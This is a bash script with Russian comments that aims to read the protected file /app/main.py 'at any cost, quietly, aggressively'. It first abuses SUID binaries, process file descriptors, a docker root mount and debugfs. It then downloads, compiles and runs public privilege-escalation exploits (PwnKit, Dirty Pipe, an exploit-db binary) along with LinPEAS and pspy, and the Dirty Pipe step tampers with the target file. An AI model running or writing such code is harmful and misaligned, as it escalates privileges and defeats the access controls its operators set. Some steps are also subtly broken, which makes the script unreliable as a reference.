#!/bin/bash
# uber_reader.sh – читаем /app/main.py любой ценой
#            – тихо, агрессивно, со скачиванием эксплойтов
# =========================================================

TARGET="/app/main.py"
NAME="main.py"
TMPDIR="/tmp/.uber_$(date +%s%N)"
mkdir -p "$TMPDIR"
OUT="$TMPDIR/content.txt"
FOUND=0

# ------------------------------------------------------------------
# Функция: сохранить содержимое, если найдено
save() {
    if [ -s "$1" ] && [ $FOUND -eq 0 ]; then
        cp "$1" "$OUT" 2>/dev/null
        FOUND=1
    fi
}

# ------------------------------------------------------------------
# 1. ВСЕ локальные методы (cat, sudo, suid, proc, docker, ln, debugfs, ...)
# ------------------------------------------------------------------
[ $FOUND -eq 0 ] && cat "$TARGET" 2>/dev/null > "$TMPDIR/a1" && save "$TMPDIR/a1"
[ $FOUND -eq 0 ] && sudo cat "$TARGET" 2>/dev/null > "$TMPDIR/a2" && save "$TMPDIR/a2"

# SUID-штурм
for bin in $(find / -perm -4000 -type f 2>/dev/null | head -200); do
    [ $FOUND -eq 1 ] && break
    case "$bin" in
        */cat)      $bin "$TARGET" 2>/dev/null > "$TMPDIR/s1" && save "$TMPDIR/s1" ;;
        */less)     (echo ":e $TARGET"; echo ":q") | $bin 2>/dev/null > "$TMPDIR/s2" && save "$TMPDIR/s2" ;;
        */more)     $bin "$TARGET" 2>/dev/null > "$TMPDIR/s3" && save "$TMPDIR/s3" ;;
        */awk)      $bin '{print}' "$TARGET" 2>/dev/null > "$TMPDIR/s4" && save "$TMPDIR/s4" ;;
        */perl)     $bin -ne 'print' "$TARGET" 2>/dev/null > "$TMPDIR/s5" && save "$TMPDIR/s5" ;;
        */python*)  $bin -c "print(open('$TARGET').read())" 2>/dev/null > "$TMPDIR/s6" && save "$TMPDIR/s6" ;;
        */find)     $bin $(dirname "$TARGET") -name $(basename "$TARGET") -exec cat {} \; 2>/dev/null > "$TMPDIR/s7" && save "$TMPDIR/s7" ;;
        */nice|*/time) $bin cat "$TARGET" 2>/dev/null > "$TMPDIR/s8" && save "$TMPDIR/s8" ;;
    esac
done

# Дескрипторы процессов
if [ $FOUND -eq 0 ]; then
    for pid in /proc/[0-9]*; do
        for fd in $pid/fd/*; do
            [ "$(readlink -f "$fd" 2>/dev/null)" = "$TARGET" ] && cat "$fd" 2>/dev/null > "$TMPDIR/fd1" && save "$TMPDIR/fd1" && break 2
        done
    done
fi

# Docker
[ $FOUND -eq 0 ] && groups | grep -q docker && docker run --rm -v /:/host alpine cat "host$TARGET" 2>/dev/null > "$TMPDIR/d1" && save "$TMPDIR/d1"

# жесткая ссылка
[ $FOUND -eq 0 ] && ln "$TARGET" "$TMPDIR/hlink" 2>/dev/null && cat "$TMPDIR/hlink" 2>/dev/null > "$TMPDIR/l1" && save "$TMPDIR/l1"

# debugfs (если примонтирована)
[ $FOUND -eq 0 ] && command -v debugfs &>/dev/null && debugfs -R "cat $TARGET" /dev/$(mount | grep " / " | cut -d' ' -f1) 2>/dev/null > "$TMPDIR/debug" && save "$TMPDIR/debug"

# ==================================================================
# 2. СКАЧИВАНИЕ ЭКСПЛОЙТОВ (если локально не получилось)
# ==================================================================
if [ $FOUND -eq 0 ]; then
    echo "[+] Скачиваю эксплойты..." >&2
    cd "$TMPDIR" || exit 1

    # 2.1 CVE-2021-4034 (pkexec)
    wget -q https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/PWNKIT.c -O pwnkit.c 2>/dev/null || curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/PWNKIT.c -o pwnkit.c
    if [ -f pwnkit.c ]; then
        gcc pwnkit.c -o pwnkit 2>/dev/null
        [ -x ./pwnkit ] && ./pwnkit -c "cat $TARGET" 2>/dev/null > cve4034_out
        [ -s cve4034_out ] && save cve4034_out
    fi

    # 2.2 CVE-2022-0847 (Dirty Pipe)
    if [ $FOUND -eq 0 ]; then
        wget -q https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c -O dirtypipe.c 2>/dev/null
        gcc dirtypipe.c -o dirtypipe 2>/dev/null
        if [ -x ./dirtypipe ]; then
            ./dirtypipe "$TARGET" 0 2>/dev/null
            cat "$TARGET" 2>/dev/null > dirty_out
            save dirty_out
        fi
    fi

    # 2.3 pspy – не эксплойт, но может показать процессы, читающие target
    wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy 2>/dev/null
    chmod +x pspy
    timeout 5 ./pspy 2>/dev/null | grep -i "$NAME" > pspy_hint
    # (само по себе не даст содержимого, но может дать подсказку)

    # 2.4 LinPEAS – сбор данных о системе (не даёт файл, но может показать вектор)
    wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh 2>/dev/null
    chmod +x linpeas.sh
    timeout 10 ./linpeas.sh -a 2>/dev/null | grep -A5 -B5 "$NAME" > linpeas_hint

    # 2.5 Полный авто-эксплойт Linux – некоторые делают чтение любых файлов
    wget -q https://raw.githubusercontent.com/joker0x/Linux-Exploit-Suggester/master/linux-exploit-suggester.sh -O suggester.sh 2>/dev/null
    chmod +x suggester.sh
    ./suggester.sh 2>/dev/null | grep -E "CVE-20[0-9]{2}" > cve_list
fi

# ==================================================================
# 3. ЕЩЁ ОДИН УРОВЕНЬ: парсим известные уязвимости через CVE-шёлк
# ==================================================================
if [ $FOUND -eq 0 ] && command -v python3 &>/dev/null; then
    python3 - <<EOF
import os, requests, subprocess
target = "$TARGET"
tmp = "$TMPDIR"
# CVE-2017-1000112 (Netfilter) – чтение произвольного файла
cve = "https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/45621.zip"
try:
    r = requests.get(cve, timeout=10)
    with open(f"{tmp}/exp.zip", "wb") as f:
        f.write(r.content)
    subprocess.run(f"unzip -q {tmp}/exp.zip -d {tmp}", shell=True)
    subprocess.run(f"chmod +x {tmp}/45621 && {tmp}/45621 {target}", shell=True)
except:
    pass
EOF
    [ -s "$TMPDIR/45621_out" ] && cat "$TMPDIR/45621_out" > "$TMPDIR/xx" && save "$TMPDIR/xx"
fi

# ==================================================================
# 4. Если нашли – показываем ТОЛЬКО содержимое файла
# ==================================================================
if [ $FOUND -eq 1 ]; then
    cat "$OUT"
else
    echo "[!] Не удалось прочитать $TARGET даже после скачивания эксплойтов" >&2
    exit 1
fi

# Убираем за собой (по желанию)
rm -rf "$TMPDIR" 2>/dev/null
